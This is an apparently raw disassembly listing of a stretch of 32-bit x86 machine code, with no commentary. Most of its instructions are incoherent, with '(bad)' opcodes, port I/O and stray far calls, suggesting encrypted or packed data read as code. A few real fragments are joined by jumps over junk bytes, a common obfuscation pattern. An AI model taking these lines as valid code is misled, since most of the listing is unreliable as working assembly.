  40c778:	fs scas al,BYTE PTR es:[edi]
  40c77a:	jo     0x40c7b6
  40c77c:	xor    al,0x1a
  40c77e:	out    0x39,al
  40c780:	push   0xffffff99
  40c782:	pop    eax
  40c783:	push   esp
  40c784:	adc    esi,esp
  40c786:	add    BYTE PTR [esi+0x78],bl
  40c789:	mov    ebp,0xd64d0a81
  40c78e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c78f:	sub    edx,0x92d3a8b5
  40c795:	in     eax,dx
  40c796:	scas   al,BYTE PTR es:[edi]
  40c797:	xchg   ebp,eax
  40c798:	or     BYTE PTR [ebp+0x40],dl
  40c79b:	sub    DWORD PTR [ebp+0x6c74137d],esi
  40c7a1:	jmp    0x40c7b9
  40c7a3:	push   0xf
  40c7a5:	lock call 0x9f5f:0x8e27a120
  40c7ad:	jl     0x40c7c2
  40c7af:	or     al,0xe1
  40c7b1:	mov    ah,0xec
  40c7b3:	stos   DWORD PTR es:[edi],eax
  40c7b4:	pop    ebx
  40c7b5:	lds    ecx,FWORD PTR [esi-0x767eb090]
  40c7bb:	cmp    DWORD PTR [edi+esi*2+0x15],esp
  40c7bf:	push   ebx
  40c7c0:	jnp    0x40c779
  40c7c2:	test   DWORD PTR [ecx],0x97ef36a9
  40c7c8:	jge    0x40c808
  40c7ca:	mov    eax,ds:0x50f51881
  40c7cf:	js     0x40c81e
  40c7d1:	or     ebp,edx
  40c7d3:	sahf   
  40c7d4:	pushf  
  40c7d5:	ja     0x40c767
  40c7d7:	cli    
  40c7d8:	outs   dx,DWORD PTR ds:[esi]
  40c7d9:	scas   al,BYTE PTR es:[edi]
  40c7da:	dec    ebx
  40c7db:	rcl    ebp,1
  40c7dd:	jmp    0xfeb0f59b
  40c7e2:	in     al,0x35
  40c7e4:	lea    esi,[edx+0x34]
  40c7e7:	pop    edx
  40c7e8:	and    eax,0xdd3e9ba4
  40c7ed:	sbb    ebp,DWORD PTR [edx+edx*4+0x32]
  40c7f1:	lods   eax,DWORD PTR ds:[esi]
  40c7f2:	or     DWORD PTR [eax+ecx*8],ecx
  40c7f5:	pop    es
  40c7f6:	mov    ch,0x72
  40c7f8:	stos   DWORD PTR es:[edi],eax
  40c7f9:	mov    eax,ds:0x5cb15979
  40c7fe:	fsub   QWORD PTR [ebx]
  40c800:	dec    ebp
  40c801:	ret    0x87ab
  40c804:	int    0x1b
  40c806:	jns    0x40c7dc
  40c808:	imul   ebp,eax,0x17
  40c80b:	dec    esp
  40c80c:	gs and edx,ebx
  40c80f:	mov    ebp,0xfb9fbabf
  40c814:	mov    ebx,DWORD PTR [eax+0x62]
  40c817:	cmp    eax,0xc7e47542
  40c81c:	add    eax,0xb602190
  40c821:	add    dl,BYTE PTR [edi+0x3a72bb93]
  40c827:	inc    edi
  40c828:	mov    bh,0x4d
  40c82a:	and    BYTE PTR [ebx],dl
  40c82c:	add    bh,BYTE PTR ds:0xf5e1252c
  40c832:	lods   eax,DWORD PTR ds:[esi]
  40c833:	es stc 
  40c835:	pusha  
  40c836:	add    al,0x65
  40c838:	and    eax,0xa6986613
  40c83d:	in     eax,dx
  40c83e:	mov    ch,0x52
  40c840:	xor    eax,0x79a62433
  40c845:	lock and ah,dh
  40c848:	icebp  
  40c849:	out    dx,al
  40c84a:	adc    DWORD PTR [edx],edx
  40c84c:	out    dx,al
  40c84d:	jae    0x40c82e
  40c84f:	cli    
  40c850:	daa    
  40c851:	mov    al,ds:0x9ea6a5fb
  40c856:	cmp    BYTE PTR [ebx-0x60],dl
  40c859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85a:	xchg   edx,eax
  40c85b:	mov    ds:0x48579342,eax
  40c860:	(bad)  
  40c862:	adc    eax,0xa7fa34ac
  40c867:	outs   dx,BYTE PTR gs:[esi]
  40c869:	stc    
  40c86a:	addr16 leave 
  40c86c:	das    
  40c86d:	stos   BYTE PTR es:[edi],al
  40c86e:	test   BYTE PTR [edx-0x470b60c2],bh
  40c874:	sbb    ch,0xc9
  40c877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c878:	sahf   
  40c879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c87a:	or     DWORD PTR [ecx-0x2c],edx
  40c87d:	mov    WORD PTR [ebp+0x7af93755],fs
  40c883:	mov    ebp,0x642b61fa
  40c888:	xor    BYTE PTR [esi],bl
  40c88a:	jge    0x40c83d
  40c88c:	pop    ebp
  40c88d:	mov    eax,DWORD PTR [ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x98b64367
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c945
  40c8c7:	push   ebx
  40c8c8:	jns    0x40c8a3
  40c8ca:	inc    esi
  40c8cb:	js     0x40c8fd
  40c8cd:	mov    al,ds:0x2de5e8b8
  40c8d2:	cmc    
  40c8d3:	sbb    al,0x44
  40c8d5:	mov    cl,0x4
  40c8d7:	pop    ss
  40c8d8:	outs   dx,BYTE PTR ds:[esi]
  40c8d9:	scas   al,BYTE PTR es:[edi]
  40c8da:	add    cl,bl
  40c8dc:	lods   eax,DWORD PTR ds:[esi]
  40c8dd:	pop    edx
  40c8de:	inc    esi
  40c8df:	sub    al,0xf1
  40c8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e2:	frstor [esi+0x3f]
  40c8e5:	jecxz  0x40c921
  40c8e7:	fucomp st(4)
  40c8e9:	dec    ebp
  40c8ea:	or     eax,0x2cd1bbc0
  40c8ef:	(bad)  
  40c8f0:	sub    DWORD PTR [edi],ebx
  40c8f2:	dec    eax
  40c8f3:	lahf   
  40c8f4:	arpl   bx,di
  40c8f6:	jmp    0xaff17b2e
  40c8fb:	loope  0x40c921
  40c8fd:	gs sbb al,0xa1
  40c900:	in     al,0x46
  40c902:	mov    esp,0x4fe4ea66
  40c907:	int    0x5f
  40c909:	mov    dh,0x71
  40c90b:	cld    
  40c90c:	nop
  40c90d:	mov    ?,WORD PTR [ecx-0x14]
  40c910:	(bad)  
  40c911:	mov    BYTE PTR [ebx-0x4057c18f],ch
  40c917:	es push ds
  40c919:	sbb    BYTE PTR [esi],bl
  40c91b:	cld    
  40c91c:	adc    DWORD PTR [edx-0x3cc1e4c2],esi
  40c922:	cli    
  40c923:	scas   al,BYTE PTR es:[edi]
  40c924:	sub    DWORD PTR [ecx-0x5fa1ecad],eax
  40c92a:	not    BYTE PTR [ecx+eiz*4]
  40c92d:	shl    DWORD PTR [ebx+0x2b],0x27
  40c931:	inc    ecx
  40c932:	xlat   BYTE PTR ds:[ebx]
  40c933:	jl     0x40c99d
  40c935:	xchg   ebp,eax
  40c936:	ins    DWORD PTR es:[edi],dx
  40c937:	pop    ebp
  40c938:	sti    
  40c939:	out    dx,al
  40c93a:	dec    edi
  40c93b:	shl    DWORD PTR [edx],1
  40c93d:	out    0x7e,al
  40c93f:	not    edi
  40c941:	call   0x4873b40d
  40c946:	mov    al,ds:0x8f0a3289
  40c94b:	adc    cl,cl
  40c94d:	imul   al
  40c94f:	imul   esi,DWORD PTR [esi-0x5],0x2b
  40c953:	lods   al,BYTE PTR ds:[esi]
  40c954:	cmp    dh,BYTE PTR ds:0xd171016c
  40c95a:	fistp  WORD PTR [eax-0x73]
  40c95d:	sbb    eax,DWORD PTR [ecx+0x261ced15]
  40c963:	and    bh,0x40
  40c966:	int    0xac
  40c968:	fbstp  TBYTE PTR [ecx-0x6a]
  40c96b:	or     DWORD PTR [ebp+eax*2+0x7d],ecx
  40c96f:	shr    BYTE PTR [edi-0x28],1
  40c972:	lods   al,BYTE PTR ds:[esi]
  40c973:	push   esi
  40c974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c975:	or     DWORD PTR [ecx-0x4eec34f6],eax
  40c97b:	(bad)  
  40c97c:	icebp  
  40c97d:	cmp    bh,BYTE PTR [edx]
  40c97f:	push   0x54
  40c981:	stos   BYTE PTR es:[edi],al
  40c982:	and    BYTE PTR [esi+0x583183f6],al
  40c988:	in     al,dx
  40c989:	bnd jae 0x40c961
  40c98c:	jns    0x40c98d
  40c98e:	jae    0x40c9dd
  40c990:	push   edi
  40c991:	mov    bh,0x23
  40c993:	es fsubr QWORD PTR gs:[esi]
  40c997:	mov    eax,0xc05e0eb5
  40c99c:	ss mov ch,0xdf
  40c99f:	inc    ebx
  40c9a0:	push   ecx
  40c9a1:	push   0xb
  40c9a3:	mov    cl,0xc3
  40c9a5:	adc    BYTE PTR ds:0x143371d2,al
  40c9ab:	hlt    
  40c9ac:	mov    ah,0x44
  40c9ae:	xor    ecx,DWORD PTR [edx-0x184402b8]
  40c9b4:	adc    ebp,DWORD PTR ds:0xc31e53cf
  40c9ba:	test   BYTE PTR [eax-0x446ac7f4],cl
  40c9c0:	fldlg2 
  40c9c2:	lds    edx,FWORD PTR [esp+esi*8-0x70]
  40c9c6:	fsub   st,st(3)
  40c9c8:	or     eax,DWORD PTR [esi-0x72]
  40c9cb:	mov    eax,ds:0x4e2d20bc
  40c9d0:	adc    BYTE PTR [edi],ah
  40c9d2:	dec    ebp
  40c9d3:	outs   dx,BYTE PTR ds:[esi]
  40c9d4:	loop   0x40c9f9
  40c9d6:	add    DWORD PTR [ecx-0x30],esi
  40c9d9:	mov    dh,0x6f
  40c9db:	shl    BYTE PTR [ebx],cl
  40c9dd:	fnstcw WORD PTR [ecx+0x6ecdf386]
  40c9e3:	rol    BYTE PTR [edi+0x10],cl
  40c9e6:	daa    
  40c9e7:	(bad)  [edx-0x6c1a0f91]
  40c9ed:	(bad)  
  40c9ef:	idiv   BYTE PTR [ebx]
  40c9f1:	stc    
  40c9f2:	add    al,bl
  40c9f4:	out    dx,al
  40c9f5:	xchg   BYTE PTR [ebp+0x57],dl
  40c9f8:	sbb    al,0xd8
  40c9fa:	sub    ecx,DWORD PTR [edx]
  40c9fc:	and    DWORD PTR [ecx+0x18],0xffffffb6
  40ca00:	dec    eax
  40ca01:	jae    0x40c9fb
  40ca03:	push   eax
  40ca04:	cmp    BYTE PTR [ebx+ebx*4],ch
  40ca07:	dec    ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x7360cf
  40ca1c:	sub    ecx,DWORD PTR [eax-0xc]
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca6d
  40ca26:	or     bh,bl
  40ca28:	push   0xffffff94
  40ca2a:	xchg   esi,eax
  40ca2b:	data16 fimul WORD PTR [edi+0x43]
  40ca2f:	mov    edx,DWORD PTR [edx]
  40ca31:	jecxz  0x40c9bd
  40ca33:	stos   DWORD PTR es:[edi],eax
  40ca34:	inc    edx
  40ca35:	sbb    al,0xc6
  40ca37:	lds    eax,FWORD PTR [edi+0x67]
  40ca3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca3b:	inc    esi
  40ca3c:	xchg   ebp,eax
  40ca3d:	push   ss
  40ca3e:	repnz retf 
  40ca40:	or     DWORD PTR [edi+0x3],edx
  40ca43:	cmp    al,0x6d
  40ca45:	cli    
  40ca46:	add    eax,0xc0b07d8a
  40ca4b:	fisttp QWORD PTR [ebx+0x3c]
  40ca4e:	sbb    BYTE PTR [edi*8-0x4b34611c],bl
  40ca55:	bound  esp,QWORD PTR [edi]
  40ca57:	mov    edi,0xf5e1e1bf
  40ca5c:	mov    dl,0x36
  40ca5e:	or     DWORD PTR [edx-0x11],0x7f248b85
  40ca65:	jle    0x40ca44
  40ca67:	mov    ebp,0x66b51e7
  40ca6c:	mul    DWORD PTR [ebx-0x6f273946]
  40ca72:	fwait
  40ca73:	ret    
  40ca74:	pusha  
  40ca75:	into   
  40ca76:	aas    
  40ca77:	popa   
  40ca78:	sbb    edi,DWORD PTR [eax+eax*4]
  40ca7b:	mov    al,0x77
  40ca7d:	push   esp
  40ca7e:	dec    edi
  40ca7f:	imul   dl
  40ca81:	rcr    BYTE PTR [eax-0x7239a220],0x6
  40ca88:	leave  
  40ca89:	icebp  
  40ca8a:	test   DWORD PTR [edx-0x6828f1c2],edx
  40ca90:	inc    edi
  40ca91:	mov    al,ds:0x1dcb23e8
  40ca96:	shl    DWORD PTR [ecx+0x63f6c8bf],1
  40ca9c:	popf   
  40ca9d:	mov    ?,esp
  40ca9f:	(bad)  
  40caa0:	ss (bad) 
  40caa2:	sbb    BYTE PTR [ecx+edi*4-0x2bb542c2],dl
  40caa9:	dec    esi
  40caaa:	sbb    eax,edi
  40caac:	push   edx
  40caad:	xchg   edi,eax
  40caae:	mov    edi,esi
  40cab0:	repz retf 
  40cab2:	jne    0x40ca69
  40cab4:	loope  0x40cb04
  40cab6:	ret    0x8abe
  40cab9:	jb     0x40caf6
  40cabb:	jb     0x40ca3f
  40cabd:	push   edx
  40cabe:	and    eax,0x85d12e49
  40cac3:	std    
  40cac4:	sbb    bl,ch
  40cac6:	out    0x33,al
  40cac8:	jae    0x40cac2
  40caca:	lea    esp,[eax]
  40cacc:	test   al,0x7
  40cace:	popf   
  40cacf:	pop    ebp
  40cad0:	sub    DWORD PTR es:[eax-0x7e],esp
  40cad4:	sub    eax,0xb815ffa
  40cad9:	pop    es
  40cada:	imul   ebp,DWORD PTR [ecx+0x77f4830e],0x5c
  40cae1:	ins    BYTE PTR es:[edi],dx
  40cae2:	shr    DWORD PTR [esi+0x44ec9af4],cl
  40cae8:	data16 js 0x40cada
  40caeb:	sub    eax,0x2bebacd9
  40caf0:	mov    cl,0x52
  40caf2:	clc    
  40caf3:	leave  
  40caf4:	sub    BYTE PTR [ecx-0x5ced93f6],0x82
  40cafb:	dec    eax
  40cafc:	iret   
  40cafd:	add    DWORD PTR [edx+ecx*8-0x38],ecx
  40cb01:	lahf   
  40cb02:	add    eax,0xffffffdc
  40cb05:	int    0xc6
  40cb07:	outs   dx,BYTE PTR ds:[esi]
  40cb08:	cmova  esp,eax
  40cb0b:	dec    ebp
  40cb0c:	cmp    DWORD PTR [eax+0x10d44848],edi
  40cb12:	mov    esi,0xebcba873
  40cb17:	mov    dl,BYTE PTR [ecx]
  40cb19:	daa    
  40cb1a:	sub    BYTE PTR [esi+ebx*1],0xf8
  40cb1e:	push   esp
  40cb1f:	push   ds
  40cb20:	call   0x1484:0x77a68d0d
  40cb27:	aas    
  40cb28:	retf   
  40cb29:	dec    esp
  40cb2a:	mov    ecx,es
  40cb2c:	sbb    DWORD PTR [ebp+0x26],esp
  40cb2f:	mov    ebx,0x2a9deb66
  40cb34:	lahf   
  40cb35:	cmp    DWORD PTR ss:[esi+0x56],edi
  40cb39:	xlat   BYTE PTR ds:[ebx]
  40cb3a:	les    edi,FWORD PTR [ecx]
  40cb3c:	nop
  40cb3d:	cmp    al,0x64
  40cb3f:	hlt    
  40cb40:	rol    esi,0x19
  40cb43:	inc    eax
  40cb44:	rcr    ch,1
  40cb46:	jecxz  0x40caf6
  40cb48:	adc    edi,esi
  40cb4a:	push   0x6d94c4bf
  40cb4f:	jb     0x40cb39
  40cb51:	mov    esp,0xe1bc9ee1
  40cb56:	mov    ch,0x37
  40cb58:	enter  0xa4af,0xf4
  40cb5c:	sahf   
  40cb5d:	cmp    dh,cl
  40cb5f:	test   eax,0x4b68974e
  40cb64:	push   es
  40cb65:	pop    ecx
  40cb66:	pop    ebx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbbc
  40cb8b:	pop    ss
  40cb8c:	inc    ebp
  40cb8d:	xchg   ebx,eax
  40cb8e:	or     esi,esi
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cbfa
  40cb97:	retf   0x1ed6
  40cb9a:	adc    edx,DWORD PTR [esi+0x115d9b36]
  40cba0:	sbb    ebx,DWORD PTR [ebx]
  40cba2:	mov    ds:0x20d14f61,al
  40cba7:	inc    esp
  40cba8:	aas    
  40cba9:	mov    cl,0x39
  40cbab:	dec    edx
  40cbac:	or     al,BYTE PTR [ebx]
  40cbae:	jg     0x40cbfb
  40cbb0:	sub    BYTE PTR ds:0x181abca2,bh
  40cbb6:	and    si,WORD PTR [ebx]
  40cbb9:	dec    ecx
  40cbba:	cld    
  40cbbb:	retf   0x6d01
  40cbbe:	jo     0x40cbf5
  40cbc0:	jg     0x40cc3e
  40cbc2:	push   ecx
  40cbc3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbc5:	cmp    DWORD PTR [ebx+0x4ad24bb2],0xffffffa5
  40cbcc:	arpl   WORD PTR [ecx],sp
  40cbce:	cmp    DWORD PTR [ebx-0x6afd0d34],0xffffffa4
  40cbd5:	mov    edi,DWORD PTR ds:[ebx-0xc]
  40cbd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbda:	dec    ecx
  40cbdb:	xchg   esp,eax
  40cbdc:	mov    edx,0x7272c763
  40cbe1:	cmp    esi,DWORD PTR ds:0xe847f5df
  40cbe7:	jns    0x40cbd4
  40cbe9:	test   al,0x92
  40cbeb:	xchg   ebp,eax
  40cbec:	test   DWORD PTR [eax+0x35f203d6],ebx
  40cbf2:	pop    eax
  40cbf3:	mov    esi,gs
  40cbf5:	ins    DWORD PTR es:[edi],dx
  40cbf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbf7:	out    dx,al
  40cbf8:	mov    WORD PTR [esi-0x57],gs
  40cbfb:	dec    ebp
  40cbfc:	xor    DWORD PTR [edx],esp
  40cbfe:	(bad)  
  40cbff:	les    edx,FWORD PTR [ebp-0x22]
  40cc02:	push   0x6c
  40cc04:	stos   BYTE PTR es:[edi],al
  40cc05:	dec    ebp
  40cc06:	neg    DWORD PTR [edx+ebp*8]
  40cc09:	xchg   edi,eax
  40cc0a:	push   ebx
  40cc0b:	in     eax,0x6b
  40cc0d:	inc    eax
  40cc0e:	loop   0x40cc85
  40cc10:	les    ecx,FWORD PTR [ebp-0x7d39cf5f]
  40cc16:	mov    dh,0x76
  40cc18:	arpl   dx,si
  40cc1a:	xchg   ebx,eax
  40cc1b:	cdq    
  40cc1c:	popf   
  40cc1d:	xchg   BYTE PTR [esi+0x2a7a49ce],dh
  40cc23:	mov    ds:0x41f822fe,al
  40cc28:	sub    eax,0xdb125acc
  40cc2d:	pop    ss
  40cc2e:	mov    edi,0x7f14d13f
  40cc33:	shr    ebp,cl
  40cc35:	hlt    
  40cc36:	push   cs
  40cc37:	mov    ebp,0x34cff3dd
  40cc3c:	enter  0x8abe,0xb8
  40cc40:	xor    bl,BYTE PTR [ecx+0x12]
  40cc43:	mov    esi,0xd5f5dfc2
  40cc48:	scas   al,BYTE PTR es:[edi]
  40cc49:	jl     0x40cc0a
  40cc4b:	add    DWORD PTR [ecx*8+0x14da59fc],ebp
  40cc52:	fucomip st,st(0)
  40cc54:	adc    dl,BYTE PTR [ecx+0x7d994fd1]
  40cc5a:	cmc    
  40cc5b:	xor    DWORD PTR [ebx-0x2f],ebp
  40cc5e:	nop
  40cc5f:	out    0x67,al
  40cc61:	adc    al,0xbb
  40cc63:	dec    esp
  40cc64:	xchg   DWORD PTR [eax-0x18af0589],eax
  40cc6a:	or     ecx,DWORD PTR [ebp-0xa]
  40cc6d:	outs   dx,BYTE PTR ds:[esi]
  40cc6e:	xchg   esi,eax
  40cc6f:	(bad)  
  40cc70:	xchg   edi,eax
  40cc71:	call   0xda96:0x1f00183
  40cc78:	push   ebx
  40cc79:	mov    ds:0x8e2fbbc2,eax
  40cc7e:	mov    bh,0xa3
  40cc80:	sbb    ecx,DWORD PTR [ebp+0x7f]
  40cc83:	mov    esi,ds
  40cc85:	stos   DWORD PTR es:[edi],eax
  40cc86:	jmp    0x12c4:0x4bc9a9ef
  40cc8d:	sbb    eax,0x851bf4a7
  40cc92:	or     BYTE PTR [eax-0x7ef49ff6],0x54
  40cc99:	(bad)  
  40cc9a:	mov    eax,ds:0xcf03f7b3
  40cc9f:	jo     0x40cc4b
  40cca1:	cmp    eax,0x449e39dc
  40cca6:	ficom  WORD PTR [eax]
  40cca8:	sub    BYTE PTR [edx-0x747f7e99],0x3d
  40ccaf:	adc    ebp,DWORD PTR [ecx+0x2a]
  40ccb2:	cdq    
  40ccb3:	push   ecx
  40ccb4:	sbb    al,0x69
  40ccb6:	cmp    esp,DWORD PTR [eax]
  40ccb8:	sbb    DWORD PTR [eax],esp
  40ccba:	stos   BYTE PTR es:[edi],al
  40ccbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccbc:	adc    esi,ebx
  40ccbe:	adc    bh,BYTE PTR [edx]
  40ccc0:	pop    edi
  40ccc1:	fwait
  40ccc2:	js     0x40ccf2
  40ccc4:	xchg   esi,eax
  40ccc5:	jle    0x40cc6a
  40ccc7:	rcr    DWORD PTR ds:0x470f09e4,cl
  40cccd:	fs mov esi,0x815e7c9e
  40ccd3:	add    esi,DWORD PTR [eax+0x458b825d]
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0xdfec1d3a
  40ccf1:	in     al,0x9f
  40ccf3:	jmp    0x7ebfc4c2
  40ccf8:	aas    
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd37
  40ccfd:	xchg   edi,eax
  40ccfe:	mul    ecx
  40cd00:	mov    ds:0x7969bbca,eax
  40cd05:	sbb    al,0xf4
  40cd07:	cli    
  40cd08:	sti    
  40cd09:	xor    DWORD PTR [bp+si-0x29f9],edi
  40cd0e:	lock in eax,dx
  40cd10:	aam    0xc3
  40cd12:	inc    ebx
  40cd13:	push   edi
  40cd14:	aam    0x94
  40cd16:	out    dx,eax
  40cd17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd18:	xor    cl,BYTE PTR [edx-0x47]
  40cd1b:	fld    st(5)
  40cd1d:	and    edi,esp
  40cd1f:	cs stos BYTE PTR es:[edi],al
  40cd21:	and    ecx,DWORD PTR [ecx+esi*4]
  40cd24:	jle    0x40cd06
  40cd26:	mov    dh,0x32
  40cd28:	icebp  
  40cd29:	(bad)  
  40cd2b:	call   ebx
  40cd2d:	fistp  WORD PTR [esi]
  40cd2f:	jp     0x40cd75
  40cd31:	or     DWORD PTR [ecx-0x1257d6b0],0xfffffff1
  40cd38:	ret    
  40cd39:	outs   dx,DWORD PTR ds:[esi]
  40cd3a:	jb     0x40cd16
  40cd3c:	mov    esi,0x2689f400
  40cd41:	into   
  40cd42:	cwde   
  40cd43:	or     dh,BYTE PTR [edx-0x67b4a854]
  40cd49:	scas   al,BYTE PTR es:[edi]
  40cd4a:	(bad)  
  40cd4b:	enter  0xc28e,0xe8
  40cd4f:	mov    esp,0xf2636b09
  40cd54:	int    0x31
  40cd56:	jbe    0x40cd54
  40cd58:	jp     0x40cdb8
  40cd5a:	mov    al,ds:0x976048fe
  40cd5f:	mov    ebx,0x380d6be4
  40cd64:	outs   dx,DWORD PTR ds:[esi]
  40cd65:	scas   al,BYTE PTR es:[edi]
  40cd66:	adc    bh,ah
  40cd68:	aam    0x4a
  40cd6a:	retf   0x7109
  40cd6d:	loope  0x40cd61
  40cd6f:	mov    dl,0x7a
  40cd71:	xchg   edx,eax
  40cd72:	and    al,0x48
  40cd74:	mov    esp,0xf4f95c7f
  40cd79:	push   0x68
  40cd7b:	scas   al,BYTE PTR es:[edi]
  40cd7c:	fisub  DWORD PTR [edi+0x20]
  40cd7f:	xchg   esi,eax
  40cd80:	jmp    0x40cd30
  40cd82:	xor    BYTE PTR [ecx+0x4a],cl
  40cd85:	mov    DWORD PTR [eax],edi
  40cd87:	pop    ecx
  40cd88:	mov    ebx,DWORD PTR [edi-0x3a]
  40cd8b:	add    dl,0xa6
  40cd8e:	mov    al,0x3b
  40cd90:	and    eax,0x942d59f7
  40cd95:	ret    0x1a4e
  40cd98:	call   0x4d0b4d04
  40cd9d:	sbb    ebp,ecx
  40cd9f:	inc    esp
  40cda0:	(bad)  
  40cda1:	gs push eax
  40cda3:	adc    BYTE PTR [eax+0x558a349f],bh
  40cda9:	push   edi
  40cdaa:	retf   0xa8ad
  40cdad:	or     BYTE PTR [ebp+0x401b717c],0x8d
  40cdb4:	iret   
  40cdb5:	ficom  DWORD PTR [ecx+0xd]
  40cdb8:	pop    ebx
  40cdb9:	hlt    
  40cdba:	push   0x0
  40cdbc:	jp     0x40ce07
  40cdbe:	pop    ds
  40cdbf:	int3   
  40cdc0:	mov    ebp,DWORD PTR [esi-0x3a263a88]
  40cdc6:	and    esp,DWORD PTR [ebp+0x5b]
  40cdc9:	cli    
  40cdca:	xchg   esi,eax
  40cdcb:	repz xchg esi,eax
  40cdcd:	out    0x36,al
  40cdcf:	or     ebx,DWORD PTR [esp+edx*4-0x45]
  40cdd3:	mov    DWORD PTR [edx],0xa0244cb2
  40cdd9:	push   esp
  40cdda:	xchg   ebp,eax
  40cddb:	outs   dx,BYTE PTR ds:[esi]
  40cddc:	out    dx,eax
  40cddd:	pop    ds
  40cdde:	push   ds
  40cddf:	shl    DWORD PTR [ebx],1
  40cde1:	mov    edx,0x9be76822
  40cde6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cde7:	out    dx,al
  40cde8:	jg     0x40ce40
  40cdea:	stos   DWORD PTR es:[edi],eax
  40cdeb:	(bad)  
  40cdec:	dec    ebx
  40cded:	rcr    BYTE PTR [ecx],1
  40cdef:	push   esi
  40cdf1:	cmp    ch,ch
  40cdf3:	pop    ebx
  40cdf4:	daa    
  40cdf5:	sbb    BYTE PTR [ecx+0x21],bh
  40cdf8:	inc    ecx
  40cdf9:	das    
  40cdfa:	jl     0x40ce52
  40cdfc:	cld    
  40cdfd:	shr    DWORD PTR [eax-0x52],cl
  40ce00:	imul   ebp,DWORD PTR [ebx+ebp*8-0x520f149c],0x2dc97128
  40ce0b:	pop    es
  40ce0c:	xor    al,0x85
  40ce0f:	adc    ebp,DWORD PTR [ebx+0x2687f775]
  40ce15:	fcomp  DWORD PTR [ecx-0x57a9e835]
  40ce1b:	int    0x4c
  40ce1d:	mov    bh,0x9f
  40ce1f:	int3   
  40ce20:	mov    bh,0x8b
  40ce22:	adc    eax,0x1ca914e5
  40ce27:	jb     0x40ce27
  40ce29:	mov    dh,0x55
  40ce2b:	inc    esi
  40ce2c:	mov    edi,0xab5271fc
  40ce31:	xchg   edx,eax
  40ce32:	xor    BYTE PTR [ebx],0xa3
  40ce35:	mov    edx,0xd6792584
  40ce3a:	sub    eax,0xc1333c83
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x5a585331,eax
  40ce59:	loope  0x40ce39
  40ce5b:	mov    ecx,DWORD PTR [eax+0x7f3f7e7e]
  40ce61:	jle    0x40cee1
  40ce63:	loopne 0x40ce0c
  40ce65:	inc    edx
  40ce66:	jmp    0x40ce52
  40ce68:	inc    ecx
  40ce69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce6a:	popf   
  40ce6b:	mov    edi,0x71e113df
  40ce70:	nop
  40ce71:	loopne 0x40ce2f
  40ce73:	push   edx
  40ce74:	cmp    ebp,edx
  40ce76:	mov    esp,DWORD PTR [ebp+0x75]
  40ce79:	add    eax,0x6c3b8f82
  40ce7e:	out    0xf,eax
  40ce80:	js     0x40cefe
  40ce82:	xchg   DWORD PTR [edx+edi*4+0x6544d60],ebp
  40ce89:	idiv   BYTE PTR [ecx+0x3d15c9d6]
  40ce8f:	push   eax
  40ce90:	aad    0xc3
  40ce92:	in     eax,0x37
  40ce94:	jae    0x40cea1
  40ce96:	pop    esp
  40ce97:	mov    cl,0xf2
  40ce99:	mov    al,0x95
  40ce9b:	sub    dl,al
  40ce9d:	in     eax,0x31
  40ce9f:	enter  0xa91b,0x33
  40cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea4:	jb     0x40cf13
  40cea6:	fimul  WORD PTR [edx-0x3b]
  40cea9:	in     eax,dx
